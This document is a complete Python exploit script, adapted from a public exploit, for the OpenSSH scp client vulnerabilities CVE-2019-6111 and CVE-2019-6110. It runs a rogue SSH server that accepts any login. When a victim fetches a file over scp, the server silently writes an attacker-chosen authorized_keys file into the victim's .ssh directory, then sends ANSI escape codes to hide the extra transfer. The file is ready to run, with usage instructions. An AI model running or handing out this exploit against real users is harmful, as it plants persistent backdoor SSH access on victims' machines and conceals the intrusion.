#!/usr/bin/python3

# Overwrite .ssh/authorized_keys with a user supplied file
# The code is build against the command "scp user@host:.ssh/id_rsa.pub ~/.ssh"
# Usage: python3 scp_CVE_2019_6111.py <server-private-key-file> <authorized-keys-file> <listening-port>

# Adapted from: https://www.exploit-db.com/exploits/46193
# Modified by: Lyubomir Kyorovski
# Exploit Author: Mark E. Haase <mhaase@hyperiongray.com>
# Exploit Title: SSHtranger Things
# Date: 2019-01-17
# Vendor Homepage: https://www.openssh.com/
# Version: OpenSSH 7.6p1
# Tested on: Ubuntu 20.04 LTS
# CVE : CVE-2019-6111, CVE-2019-6110
import sys
import logging
import paramiko
import paramiko.rsakey
import socket
import threading
from cryptography.hazmat.primitives import serialization

logging.basicConfig(level=logging.INFO)

DEFAULT_FILE_CONTENTS = 'Just a file...Nothing suspicious\n'
PAYLOAD = ''


class ScpServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    # BEGIN MODIFICATION
    # enable authentication with public keys and and no authentication
    def check_auth_publickey(self, username, key):
        logging.info('Authentication: Publickey, Username: %s', username)
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_none(self, username):
        logging.info('Authentication:  Auth-None, Username: %s', username)
        return paramiko.AUTH_SUCCESSFUL
    # END MODIFICATION

    def check_auth_password(self, username, password):
        logging.info('Authenticated with %s:%s', username, password)
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind, chanid):
        logging.info('Opened session channel %d', chanid)
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_exec_request(self, channel, command):
        command = command.decode('ascii')
        logging.info('Approving exec request: %s', command)
        parts = command.split(' ')
        # Make sure that this is a request to get a file:
        assert parts[0] == 'scp'
        assert '-f' in parts
        file = parts[-1]
        # Send file from a new thread.
        threading.Thread(target=self.send_file, args=(channel, file)).start()
        return True

    @staticmethod
    def send_file(channel, file):
        """
        The meat of the exploit:
            1. Send the requested file.
            2. Send another file that was not requested.
            3. Print ANSI escape sequences to stderr to hide the transfer of the other file
        """

        def wait_ok():
            assert channel.recv(1024) == b'\x00'

        def send_ok():
            channel.sendall(b'\x00')

        wait_ok()

        # BEGIN MODIFICATION
        logging.info('Sending requested file "%s" to channel %d', file,
                     channel.get_id())
        filename = list(filter(None, file.split('/'))).pop()
        command = 'C0664 {} {}\n'.format(len(DEFAULT_FILE_CONTENTS), filename).encode('ascii')
        channel.sendall(command)
        wait_ok()
        channel.sendall(DEFAULT_FILE_CONTENTS)
        send_ok()
        wait_ok()

        # This is CVE-2019-6111: whatever file the client requested, we send
        # them 'authorized_keys' instead.
        logging.info(
            'Sending malicious file "authorized_keys" to channel %d',
            channel.get_id()
        )
        command = 'C0664 {} authorized_keys\n'.format(len(PAYLOAD)).encode('ascii')
        channel.sendall(command)
        wait_ok()
        channel.sendall(PAYLOAD)
        send_ok()
        wait_ok()
        # END MODIFICATION

        # This is CVE-2019-6110: the client will display the text that we send
        # to stderr, even if it contains ANSI escape sequences. We can send
        # ANSI codes that clear the current line to hide the fact that a second
        # file was transmitted..
        logging.info('Covering our tracks by sending ANSI escape sequence')
        channel.sendall_stderr("\x1b[1A".encode('ascii'))
        channel.close()


def main():
    global PAYLOAD
    server_private_key_filename, authorized_keys_filename, listening_port = sys.argv[1:]

    with open(authorized_keys_filename) as f:
        PAYLOAD = f.read()

    logging.info('Loading RSA host key...')
    server_key = paramiko.rsakey.RSAKey.from_private_key_file(server_private_key_filename)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', int(listening_port)))
    sock.listen(0)
    logging.info(f'Listening on port {listening_port}')

    while True:
        try:
            client, addr = sock.accept()
            logging.info('Received connection from %s:%s', *addr)
            transport = paramiko.Transport(client)
            transport.add_server_key(server_key)
            server = ScpServer()
            transport.start_server(server=server)
        except KeyboardInterrupt:
            logging.info('Exiting')
            sys.exit(0)
        except Exception:
            pass


if __name__ == '__main__':
    main()
